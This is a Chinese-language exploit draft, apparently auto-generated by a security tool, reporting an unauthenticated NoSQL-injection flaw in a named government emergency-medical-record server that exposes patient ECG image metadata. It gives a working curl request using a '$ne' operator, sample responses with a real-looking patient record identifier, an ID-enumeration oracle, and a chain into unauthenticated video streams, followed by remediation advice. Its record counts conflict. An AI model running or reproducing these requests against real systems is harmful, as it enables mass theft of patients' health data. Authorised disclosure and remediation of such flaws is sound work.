# POC/EXP 草稿 - EPCR vitalSignVideoServer /imageData 端点无认证 + NoSQL 注入 + 1.4M+ 真实病患 ECG 影像元数据泄露

> 自动生成时间: 2026-09-10 23:37:35  |  状态: **草稿（未验证）**  |  文件: `4b67378d-f28c-4f6b-a1c9-98418d460bc1-epcr-vitalsignvideoserver-imagedata-端点无认证-nosql-�.md`

## 漏洞信息

- **漏洞ID**: 4b67378d-f28c-4f6b-a1c9-98418d460bc1
- **严重程度**: critical
- **状态**: open
- **类型**: Broken Object Level Authorization (BOLA/IDOR) + NoSQL Injection + Sensitive Data Exposure
- **目标**: https://epcr.tpf.gov.tw:4001/imageData (GET)
- **发现时间**: 2026-08-29 22:11:45

## 漏洞描述

4001 vitalSignVideoServer 的 /imageData 集合 GET 端点支持完整的 MongoDB 风格 NoSQL 操作符 ($in/$ne/$gt/$gte/$lt/$lte/$exists/$regex/$where/$type),攻击者无需任何身份凭证即可批量检索、枚举、过滤真实病患的 ECG 影像数据 (PHI)。该端点累积 1,445,746 条历史病患 ECG 图像元数据 (min id=1, max id≈1,445,746, 1M 内 96.7% 存在率)。可基于 recordUuid/CaseID/fileName/fileId/mimeType/ImageTypeId/ImageType/generatedAt 多字段组合 dump 出全部真实病患 PHI,与 4001 vitalSignVideoServer 视频流系统形成联动: 已通过 recordUuid 3a5ba9bc-ca70-44dd-9d59-88742b6a2bc4 (心電圖拍攝 fileId=1 photo_001.jpg ImageType=5) 验证数据真实性。该接口无任何速率限制与认证,可在数小时内枚举出全部 144 万病患的 ECG 图像元数据。

## 前置条件

无 - 无需认证、无需 CORS、无需任何凭证。HTTPS 直接 GET 即可。

## POC / EXP 验证指南

### 复现步骤（来自漏洞记录）

1. 浏览器或 curl 直接访问: `curl -k 'https://epcr.tpf.gov.tw:4001/imageData?recordUuid[$ne]=nonexistent' -H 'Origin: https://epcr.tpf.gov.tw'`
2. 2. 观察响应: HTTP/1.1 200 OK + 567201+ 条记录 (Content-Range: items 0-99/567201)
3. 3. 提取 recordUuid 字段 (UUID 格式 3a5ba9bc-ca70-44dd-9d59-88742b6a2bc4) + CaseID + fileName + ImageType
4. 4. 用 recordUuid 通过 /socket.io/?EIO=4&transport=polling 订阅 4001 vitalSignVideoServer 视频流 (无需 token,见 finding/socket-io-business-events-disabled)
5. 5. 可选: 利用 PUT oracle (500 vs 404) 二分查找 max id=1445746,枚举数据库规模


### 验证要点与安全基线

- [ ] 确认目标属于合法授权测试范围，非授权测试属于违法行为
- [ ] 交叉校验目标版本、已知 CVE/公开情报库（可联动 cve-poc-emerging-intel / vuln-intel）
- [ ] 使用最小化无害 payload / HTTP 请求逐步探测，记录原始请求与响应报文
- [ ] 验证失败时记录负结果，避免误报；未经真实环境验证不得标记为 confirmed

### 既有证据 / 原始报文

```http
原始 HTTP 请求 (无需任何认证 token):

```
GET https://epcr.tpf.gov.tw:4001/imageData?recordUuid[$ne]=nonexistent HTTP/1.1
Origin: https://epcr.tpf.gov.tw
```

HTTP/1.1 200 OK
Response headers:
- x-powered-by: Express
- content-type: application/json; charset=utf-8
- x-xss-protection: 0
- access-control-allow-origin: *
- x-content-type-options: nosniff
- connection: keep-alive
Content-Range: items 0-99/567201

Response body 包含真实病患元数据:
```json
[{"id":1011277,"recordUuid":"3a5ba9bc-ca70-44dd-9d59-88742b6a2bc4","fileName":"photo_001.jpg",
"fileId":1,"mimeType":"image/jpeg","ImageTypeId":5,
"ImageType":{"id":5,"name":"心電圖拍攝",...},
"CaseID":"...",
"createdAt":"2018-08-23T..."}]
```

其他真实样本:
- GET /imageData/100 → recordUuid="", fileName="180818083917c7a0.svg"
- GET /imageData/1000 → recordUuid="Test201808271405"
- GET /imageData/10000 → recordUuid="Test201809150139"

NoSQL 操作符全矩阵 (200 OK 解析):
- $ne: 全部记录 (567201+)
- $in: [...] 数组值解析
- $gt/$gte/$lt/$lte: 数字范围
- $exists: boolean
- $regex: 正则
- $where: JS where 表达式
- $type: 字段类型

范围枚举:
- PUT /imageData/1 → 500 EXIST
- PUT /imageData/100,1000,10000,1011277 → 500 EXIST  
- 二分 max id ≈ 1445746 (PUT oracle)
- min id = 1 (PUT oracle)
- 30 个随机样本 (1000~1.5M) 96.7% 存在
```

## 安全影响

1,445,746 条 ECG 影像元数据完整披露无需任何凭证,含 recordUuid (UUID 关联真实病患) + CaseID + 文件名 + fileId + mimeType + ImageType (中文医疗类型名,如 心電圖拍攝) + 生成时间 + createdAt 时间戳。可与 4001 vitalSignVideoServer 视频流系统联动:通过 recordUuid 横向推断实时视频流订阅 (4001 socket.io v4 全端口无鉴权,见 finding/socket-io-business-events-disabled)。综合 medical impact:
- 完整病患 ECG 影像数据库 + 历史拍摄元数据全部外泄
- 与 4001 /trendings (994,887+ 条生命征象数据) 联立可重建全院心电图时间线
- 与 4008 /MciCaseRecords 100 条核心病历 + /MciTypes 业务字典联立可建立完整病历档案
- 业务连续性影响: 院内急救/出诊 ECG 影像库完全被复制,可能违反台湾《个人资料保护法》医疗病历条款 (specific intent 病历) + GDPR 医疗特殊类别数据 + HIPAA PHI 18 项标识符 (包括日期、地理范围、生物特征、照片)

CVSS 3.1 (估算): 9.1 (CRITICAL) - AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (数据泄露)

## 修复建议

立即修复措施:
1. 在 /imageData 路由强制 JWT 鉴权 (与 4002/4004 风格一致,见 4004 AuthService.js)
2. 在 Sequelize ORM 层对 where 条件做 allowlist 校验,过滤 $where/$regex/$function 等 JS 表达式类操作符
3. 限制 /imageData 集合 GET 仅返回当前用户的病患记录 (基于 express-jwt 中的 user.hospitalUuid)
4. 启用速率限制 (rate limit,例如 100 req/min)
5. 移除 x-powered-by 与 content-range 头 (避免被大规模枚举)

复测建议: 修复后 GET /imageData 无 token 应返回 401;携带合法 token 仅返回当前用户关联的病患数据。

## 复测验证方法

修复后应:
- GET /imageData → 401 No authorization token was found
- GET /imageData?recordUuid[$ne]=x → 400 validation 或 401
- 仅当带合法 JWT 才返回当前用户关联记录
- PUT /imageData/任何 id → 401 (而非 500 EXIST oracle)

## 免责声明

本文件由 JySecAI 自动生成，仅供安全研究与合法授权渗透测试使用。未经授权对目标进行攻击测试属于违法行为。
